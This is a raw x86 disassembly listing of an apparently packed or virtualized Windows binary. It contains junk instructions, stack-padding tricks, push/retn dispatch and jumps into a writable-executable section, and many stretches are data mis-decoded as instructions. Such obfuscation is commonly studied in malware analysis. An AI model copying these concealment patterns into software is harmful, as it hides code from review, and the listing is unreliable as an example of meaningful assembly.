mov bx [ esi ]
test ax cx
jmp rwxdata
pushad
pushad
mov [ esp + 0x8 ] esp
pushfd
lea esp [ esp + 0x44 ]
jmp rwxdata
pushad
mov [ esp ] bl
xchg edx eax
pop ecx
sub cl [ ecx - 0x16 ]
imul edi [ edx + 0x24648d3d ] 0xb2840f28
inc esp
add [ eax ] al
pushad
mov [ edi ] eax
call sub_425424
dec ebp
and dl cl
add bh cl
je rwxdata
and ebx 0xfff
cmp ch ch
push ebp
call sub_4220f3
cmc
push esp
stc
bt bx 0xd
test eax eax
pushad
call sub_42247a
add [ eax ] al
inc esi
jb rwxdata
shr [ eax ] 0x74
mov eax [ 0x5e2e4124 ]
mov dl 0xa5
0x9682
jo rwxdata
nop
fdiv st7
jmp [ eax - 0x78 ]
inc ebp
outsb
jbe rwxdata
rol [ edx ] 0x1
stc
sub eax 0x224de115
outsb
push edi
add [ ebp + 0x2474ffc0 ] al
or al 0x8d
and al 0x40
je rwxdata
mov [ esp + 0x1c ] 0xc8
lea esp [ esp + 0x40 ]
jb rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
sbb dx 0x556
lea ebx [ esi * 2 - 0x2493fa55 ]
jmp rwxdata
jmp rwxdata
inc eax
outsb
insd
outsb
je rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
mov ebx eax
adc dx di
mov edx [ ebx + 0x3c ]
call sub_425a4e
add [ eax ] al
inc edi
je rwxdata
je rwxdata
and al 0x8
je __export_name_ptr_table_4(KERNEL32:GetModuleFileNameA)
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
or [ eax ] al

imul ebp [ ebp + 0x65 ] 0x656e6f5a
dec ecx
outsb
outsw
jb rwxdata
add [ eax ] al
inc edi
je rwxdata
imul ebp [ esi + 0x67 ] 0x3d005773
jg rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
daa
popad
je rwxdata
add [ esi + 0xf ] ah
mov edx 0x20502e7
add [ eax ] al
add [ esi + 0x39 ] ah
outsd
jne rwxdata
add [ eax ] al
call sub_422b90
add [ eax ] al
dec ecx
outsb
je rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
dec ecx
rol [ edi ] 0x1
les esp [ edi ]
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
add eax 0x0
inc esi
imul ebp [ ebp + 0x4e ] 0x41656d61
insb
jb rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ds
add [ eax ] al
add [ eax ] al
dec ebp
jne rwxdata
je rwxdata
xchg edx edx
push ecx
fsubp st1
push edx
adc dh 0x86
pushfd
ficomp [ edx ]
inc esi
mov cl [ esi + 0xa2192e1 ]
jno sub_4201cb
add [ ebx + 0x51 ] ebp
shr [ esi - 0x2fd83b5c ] 0x1
pop es
jb rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
push ebx
call sub_420983
rcr si 0xb
jmp rwxdata
add [ ebp - 0x3ff60608 ] al
push edi
push 0xfbcc92f9
lea esp [ esp + 0x24 ]
je rwxdata
je rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
mov ebp 0x9bebf399
mov ch 0x8f
aaa
push esp
jg rwxdata
je rwxdata
push esi
arpl [ eax + eax + 0x4b ] si
inc ebp
push edx
dec esi
inc ebp
dec esp
xor esi [ edx ]
insb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
mov dl 0x21
xor ch cl
add cl 0xdf
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x506c6175
jb rwxdata
imul ebp [ edi + 0x6e ] 0xe9c08500
in al dx
pop ebp
add [ eax ] al
pushad
pushfd
push [ esp + 0x2c ]
retn 0x30
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushad
insb
outsd
jae rwxdata
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
popad
hlt
loope rwxdata
inc edx
jns rwxdata
jmp rwxdata
and al 0x24
je rwxdata
inc ecx
dec eax
popad
outsb
insb
add [ gs : esp + edx * 2 + 0x4244489 ] bl
clc
pushad
jmp rwxdata
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
ja rwxdata
imul ebp [ ecx + 0x62 ] 0x5400656c
cwde
push edi
pushfd
les eax [ eax ]
jg rwxdata
bound ebp [ ebp ]
cdq
jmp rwxdata
push 0x48
cmp al 0x16
push esp
outsd
push edi
imul esp [ ebp + 0x43 ] 0x726168
add [ eax ] al
dec ecx
outsb
dec eax
popad
outsb
insb
add [ gs : ebp + 0xf082464 ] cl
test [ ebx - 0x63ffffd5 ] ebp
pushfd
push 0xd81db81
push edx
stosb [ edi ]
push 0x7e77faba
push esp
pushfd
lea esp [ esp + 0x1c ]
jmp rwxdata
mov [ esp + 0x20 ] eax
test sp ax
stc
push [ esp ]
mov [ esp + 0x20 ] esi
pushfd
cmc
mov [ esp + 0x4 ] 0x75
mov [ esp + 0x20 ] edi
call sub_42638d
push 0x6aa9aedb
call sub_431bc1
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
call 0xffffffffd2e8aedd
imul [ eax ]
mov al [ 0xffffffffb2305032 ]
shl [ ebp - 0xa75796e ] 0x1
cmp [ ebp - 0x1e715a9e ] bh
mov cl 0xb1
and dh [ edi ]
test bl ch
xchg ecx eax
rcr [ ebp + 0x4d294d59 ] 0xb9
iretd
je rwxdata
inc ebx
push 0x7261
add [ ecx + 0x6e ] cl
adc eax 0x6db14d21
inc esp
add edi [ edi + 0x2b775f7b ]
dec esi
mov cl 0x54
cli
loop rwxdata
push ss
jb rwxdata
jmp rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
fisubr [ ecx + 0x2 ]
add al [ eax ]
ja rwxdata
xchg esp eax
std
xchg ebp eax
sub cl 0xda
mov eax [ 0xffffffff919a99b2 ]
dec ecx
or dl [ esi + 0x252f9 ]
xor eax 0x5200022f
and eax [ edx ]
add [ eax + 0x67 ] bh
add al [ eax ]
inc ecx
and [ edx ] eax
add [ edi + 0x6d000202 ] bh
sub al [ edx ]
add [ edx ] ah
add [ edx ] eax
add [ eax + 0x3b000202 ] ah
add al [ eax ]
dec eax
das
add al [ eax ]
sbb edx [ edx + 0x2 ]
add [ edx ] bl
and [ edx ] al
add [ ecx ] cl
add al [ eax ]
jpe __import_lookup_table_0(KERNEL32:GetStringTypeA)
pop edi
adc eax 0x5f58de6e
call 0xffffffffd2e8aedd
push eax
je rwxdata
jno rwxdata
pop edi
je rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
add al [ eax ]
mov esi 0x13000201
push esp
add al [ eax ]
out dx eax
and al [ edx ]
add [ 0x7900026a ] dl
pop ebp
add al [ eax ]
retn 0x225
add al [ eax ]
and ebp [ edi ]
add [ ecx - 0x6efffdd1 ] dl
add al [ edx ]
add [ edi ] dh
add al [ es : eax ]
pop edx
pop ebp
add al [ eax ]
pop edi
sub al 0x2
add dh al
pop ebx
add al [ eax ]
mov eax [ 0x3f000201 ]
pop eax
add al [ eax ]
and al 0x5a
add al [ eax ]
and [ ebp + 0x2 ] dl
add cl al
add eax 0x2f230002
add al [ eax ]
movsb [ edi ] [ esi ]
pop edi
add al [ eax ]
scasb [ edi ]
push esp
add al [ eax ]
add eax [ esi ]
add al [ eax ]
sub edx [ ecx + 0x2 ]
add [ ebx + 0x23 ] bh
add al [ eax ]
test eax 0xa000250
xor [ edx ] al
add [ edi + 0x2 ] bl
add al [ eax ]
and [ 0x69da0002 ] 0x2
mov ecx 0xc2710a65
loope rwxdata
insd
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
pushad
lea esp [ esp + 0x24 ]
xor edx eax
jne rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
push esp
popad
jae rwxdata
and [ edx + 0x25 ] ah
scasb [ edi ]
dec ebx
leave
xor ebx [ eax ]
test al 0x49
pop es
and ecx 0xf399bde1
jmp rwxdata
jb rwxdata
std
inc ebp
jb rwxdata
push 0x61
sbb eax [ ebx + 0x2aca3db5 ]
imul [ ebp - 0x6b0ac89a ]
fdiv [ bx + si + 0x22 ]
jno rwxdata
bound esp [ ebp - 0x4e4e1e72 ]
inc esp
popad
je rwxdata
pop edx
xchg esp eax
jne rwxdata
outsd
jb rwxdata
mov edi 0x2b775f7b
inc ecx
jbe rwxdata
sub_426cb8
lea esp [ esp + 0x28 ]
jne rwxdata
pushad
push [ esp + 0x8 ]
pushfd
jmp sub_4314fe
pushfd
pushfd
pushfd
jmp rwxdata
lea esp [ esp + 0xc ]
call sub_4225a3
pushfd
pushad
push edi
lea esp [ esp + 0x28 ]
jmp rwxdata
shld ax bp 0x8
stc
mov eax ebp
shr bl cl
dec bl
pushad
mov bl 0x1
sub esp 0xffffffe0
test si sp
bt ax di
push 0x4c9718b0
xchg [ esp ] esi
cmp sp si
rcl si cl
mov esi edi
push 0x86cbe573
sub esi eax
jmp j_sub_422ee4
sub_431648
mov [ esp + 0x4 ] 0xa8
mov [ ebp ] eax
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
push ebx
mov al [ esi ]
rol edx cl
or dh 0x15
bts edx 0x1
rol edx 0x1b
xor al bl
call sub_431524
sub_431800
pushfd
test dh 0x2d
xor edx 0x8cbfb1ac
clc
clc
test al ch
cmc
not edx
cmc
mov [ esp + 0x4 ] 0x87b4183b
mov [ esp ] bl
add edx 0x84bda997
clc
stc
ror edx 0x14
cmc
push [ esp ]
add edx 0x0
jmp rwxdata
mov [ esp + 0x3c ] edx
push eax
pushfd
push [ esp + 0x44 ]
retn 0x48
sub_431987
not esi
push 0xc28a43db
rcl bp 0x4
ror esi 0x14
clc
xchg ebx ebp
sub esi 0x231197ee
pushad
bt dx bx
bswap esi
bswap di
rol esi 0x10
bswap ebx
and bh 0x0
bswap bp
movzx bx dl
lea ebp [ esp + 0x2c ]
pushfd
jmp rwxdata
sub esp 0x90
movzx di al
pushfd
lea edi [ esp + 0x4 ]
add esp 0x4
btr bx dx
shld dx cx cl
shr dl 0x4
rcr bh cl
mov ebx esi
bswap dx
neg al
dec al
add esi [ ebp ]
push ebx
mov al [ esi ]
rol edx cl
or dh 0x15
bts edx 0x1
rol edx 0x1b
xor al bl
call sub_431524
sub_431e44
not al
shr dh cl
add al 0xa3
rcr dl 0x6
not al
rcl dh cl
not dl
sub esi 0xffffffff
pushfd
inc al
and dx 0x72db
xor bl al
pushad
rcr dh cl
btr dx si
rcr dh cl
movzx eax al
bts dx 0x8
pushfd
bts dx ax
mov edx [ eax * 4 + rwxdata ]
stc
call sub_431742
sub_43203e
not bx
push esi
not al
push edi
seta al
jmp rwxdata
jmp rwxdata
lea esi [ ecx - 0x20c63234 ]
push ebp
bswap ebx
pushfd
stc
rcr esi 0x1c
btc si bp
push edx
jmp rwxdata
pushfd
mov [ esp ] edi
not al
bswap si
push 0x0
movzx si dl
setge bl
movzx di al
movsx edi al
mov esi [ esp + 0x2c ]
lea ebp [ esi * 2 - 0x1d92643c ]
btr bp 0x3
pushfd
call sub_431987
sub_432609
pushfd
mov [ esp ] 0x29
mov [ esp ] eax
jmp rwxdata
jmp rwxdata
push ecx
pushad
mov [ esp + 0x8 ] 0x7434
mov [ esp + 0x8 ] 0x58
mov [ esp + 0x1c ] ebx
push 0xf6f7de4e
lea esp [ esp + 0x20 ]
jmp sub_43203e
sub_43268f
push 0x76efb696
push esi
mov [ esp + 0x28 ] eax
jmp rwxdata
jmp rwxdata
pushfd
mov [ esp + 0x28 ] ecx
mov [ esp + 0x4 ] 0x79cb
pushfd
mov [ esp + 0x28 ] ebx
pushfd
lea esp [ esp + 0x2c ]
jmp sub_43203e
sub_432a8e
test ch 0xfc
pushfd
shr edx 0x18
bt ebx edx
xor eax edx
add dh cl
pushfd
btc dx dx
xor eax ecx
pushad
mov edx [ esp + 0x2c ]
lea esp [ esp + 0x30 ]
pushad
dec [ ebp ]
jmp rwxdata
dec [ ebp ]
jmp rwxdata
pushad
jmp rwxdata
call sub_433388
mov [ esp ] 0x7527
lea esp [ esp + 0x4 ]
jne rwxdata
mov [ esp ] di
lea esp [ esp + 0x40 ]
jne rwxdata
cmp ah 0x6a
cmc
bts ecx edi
movzx ecx [ edx ]
test ax ax
shl eax 0x4
push 0x22ac4036
add eax ecx
shrd cx bx 0x2
mov ecx eax
test bl 0xe0
and ecx 0xf0000000
jmp rwxdata
push 0x9ba96052
mov [ ebp ] eax
pushad
pushad
mov [ esp ] 0xc18f
push [ esp + 0x4 ]
lea esp [ esp + 0x48 ]
jmp rwxdata
push edi
call sub_431648
lea esp [ esp + 0x4 ]
je rwxdata
push ebx
mov al [ esi ]
rol edx cl
or dh 0x15
bts edx 0x1
rol edx 0x1b
xor al bl
call sub_431524
pushfd
mov [ esp ] 0x67
pushfd
inc edx
pushad
pushfd
push 0x363fb6ae
lea esp [ esp + 0x30 ]
je rwxdata
bt si 0x6
push edx
add dh 0xe3
sbb dh ch
mov edx ecx
call sub_432a8e
sub_433388
jmp rwxdata
mov [ esp ] 0x7527
lea esp [ esp + 0x4 ]
jne rwxdata
cmp ah 0x6a
cmc
bts ecx edi
movzx ecx [ edx ]
test ax ax
shl eax 0x4
push 0x22ac4036
add eax ecx
shrd cx bx 0x2
mov ecx eax
test bl 0xe0
and ecx 0xf0000000
jmp rwxdata
push 0x9ba96052
mov [ ebp ] eax
pushad
pushad
mov [ esp ] 0xc18f
push [ esp + 0x4 ]
lea esp [ esp + 0x48 ]
jmp rwxdata
lea esp [ esp + 0x4 ]
je rwxdata
push ebx
mov al [ esi ]
rol edx cl
or dh 0x15
bts edx 0x1
rol edx 0x1b
xor al bl
call sub_431524
pushfd
mov [ esp ] 0x67
pushfd
inc edx
pushad
pushfd
push 0x363fb6ae
lea esp [ esp + 0x30 ]
je rwxdata
bt si 0x6
push edx
add dh 0xe3
sbb dh ch
mov edx ecx
call sub_432a8e
pushad
dec [ ebp ]
jmp rwxdata
dec [ ebp ]
jmp rwxdata
pushad
jmp rwxdata
call sub_433388
mov [ esp ] di
lea esp [ esp + 0x40 ]
jne rwxdata
push edi
call sub_431648
j_sub_4314f7
jmp sub_4314f7
sub_4201cb
test eax eax
jmp sub_425fbe
sub_4201d2
pushad
pushfd
push [ esp + 0x2c ]
retn 0x30
sub_421e61
mov ebp [ esp + 0x34 ]
pushfd
push [ esp + 0x3c ]
retn 0x40
sub_4225a3
pushad
cmp bh 0xd5
xor ecx ecx
lea esp [ esp + 0x20 ]
sub_422942
mov esi [ esp + 0x2c ]
call sub_421e61
sub_42294b
inc ecx
setb bl
jmp sub_426633
sub_422c6e
call sub_42026e
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
sub_422c89
neg al
mov [ esp ] al
mov [ esp ] dx
sub al 0x4f
pushfd
rol al 0x3
call sub_426734
push 0x6109aee2
call sub_4326f7
sub_422e55
adc dl dl
lea esp [ esp + 0x8 ]
push 0xd29f4d0b
call sub_4201d2
push 0x6af9aeda
call j_sub_432345
sub_422f5e
bt bp 0x6
jmp sub_422d89
sub_422fa0
cmc
test edi edi
mov [ esp + 0x8 ] 0xa0
jmp sub_425eba
sub_422fd4
test esi esi
pushad
push ecx
call sub_4220da
push 0x4eb9aed7
call sub_432609
sub_425216
jmp rwxdata
jmp sub_422e46
sub_4254bf
mov [ esp ] 0xfd
jmp sub_4226a5
j_sub_426a30
jmp sub_426a30
j_sub_422ee4
jmp sub_422ee4
sub_4259ba
adc dl dl
pushfd
push eax
push 0x6c0b1bda
push 0x66e52bbf
push [ esp + 0x44 ]
retn 0x48
sub_425a01
mov esp ebp
pushfd
mov ebp [ esp + 0x4 ]
push [ esp ]
pushfd
push [ esp + 0x10 ]
retn 0x14
_start
push 0x3e89aee1
call sub_432f0b
sub_425a4e
clc
test bl 0xdf
add edx ebx
clc
mov edx [ edx + 0x80 ]
pushfd
mov [ esp + 0x4 ] di
test edx edx
pushad
push [ esp ]
call sub_422d3b
0x5aee
sub_4269eb
lea esp [ esp + 0x4 ]
call sub_422e71
call sub_426787
push 0x3a79aee2
call sub_43175e
sub_426a86
shrd edi eax 0x7
mov edi [ edx + 0x10 ]
jmp sub_422f0b
sub_4314f7
test edi edi
jmp sub_4222a4
sub_4314fe
xchg ecx eax
jmp sub_420051
sub_431524
shr dh 0x7
call sub_431e44
sub_43152c
pushad
call sub_432b5b
j_sub_432345
jmp sub_432345
sub_4315bb
push edx
mov [ esp + 0x24 ] eax
mov [ esp + 0x4 ] ah
pushad
mov [ esp + 0x8 ] 0x11
mov [ esp + 0x40 ] ecx
jmp rwxdata
mov [ esp + 0x3c ] ebx
mov [ esp + 0x14 ] 0xd724b9
lea esp [ esp + 0x3c ]
jmp sub_43203e
sub_431674
mov [ esp ] bh
mov [ esp + 0x4 ] dh
pushfd
mov [ esp + 0x44 ] ebx
pushfd
lea esp [ esp + 0x48 ]
jmp sub_43203e
sub_431742
ror edx 0x4
jmp sub_431800
sub_43175e
pushad
call sub_43268f
j_sub_431aea
jmp sub_431aea
sub_431aea
pushfd
push ebp
mov [ esp + 0x4 ] eax
call sub_432285
sub_431bc1
pushfd
mov [ esp ] eax
push 0x5e29b2e5
push edx
mov [ esp + 0x4 ] ecx
call sub_432855
sub_431e83
push [ esp ]
mov [ esp + 0x24 ] eax
call sub_432919
j_sub_432134
jmp sub_432134
j_sub_432e98
jmp sub_432e98
sub_4320a0
pushad
call sub_4315bb
sub_4320dd
pushfd
call sub_43152c
sub_432134
mov [ esp + 0x30 ] ebx
push eax
mov [ esp ] di
pushfd
lea esp [ esp + 0x38 ]
jmp sub_43203e
sub_432285
pushfd
pushfd
mov [ esp + 0xc ] ecx
pushad
mov [ esp + 0x28 ] ebx
pushfd
mov [ esp ] 0x9a3b
push [ esp + 0x4 ]
push 0xa38cbdd0
lea esp [ esp + 0x34 ]
jmp sub_43203e
sub_432345
push eax
push edx
push [ esp ]
mov [ esp + 0x4 ] ecx
jmp rwxdata
mov [ esp ] ebx
sub_432363
mov [ esp + 0x30 ] ecx
call j_sub_432134
sub_4326f7
pushfd
push [ esp ]
mov [ esp + 0x4 ] eax
mov [ esp ] 0x19
pushad
pushad
call sub_432a85
sub_4327ea
pushad
call sub_431e83
sub_432855
mov [ esp ] 0x63
mov [ esp + 0x4 ] ebx
pushad
pushfd
pushfd
mov [ esp + 0x4 ] dh
lea esp [ esp + 0x2c ]
jmp sub_43203e
sub_432919
mov [ esp ] dh
mov [ esp + 0x24 ] ecx
pushfd
jmp rwxdata
jmp rwxdata
mov [ esp + 0x24 ] ebx
pushfd
push [ esp ]
lea esp [ esp + 0x2c ]
jmp sub_43203e
sub_432a85
mov [ esp + 0x44 ] ecx
jmp sub_431674
sub_432b5b
mov [ esp + 0x28 ] eax
push [ esp ]
push [ esp ]
mov [ esp ] cl
call sub_432363
sub_432e98
push edi
push [ esp + 0x4 ]
mov [ esp + 0x30 ] ebx
pushfd
lea esp [ esp + 0x34 ]
jmp sub_43203e
sub_432f0b
push 0x382a00ba
pushfd
push 0xee0e38a0
push 0x84eddea
mov [ esp + 0xc ] eax
jmp rwxdata
pushad
mov [ esp + 0x28 ] ecx
call j_sub_432e98
